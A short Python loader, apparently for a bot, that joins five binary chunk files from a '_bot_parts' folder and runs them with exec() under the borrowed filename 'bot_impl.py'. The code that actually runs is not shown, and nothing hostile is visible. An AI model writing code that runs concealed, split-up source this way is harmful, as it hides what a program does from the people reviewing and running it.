from pathlib import Path

_parts_dir = Path(__file__).with_name("_bot_parts")
_source = b"".join((_parts_dir / f"part{i}.bin").read_bytes() for i in range(1, 6))
exec(compile(_source.decode("utf-8"), str(Path(__file__).with_name("bot_impl.py")), "exec"), globals(), globals())
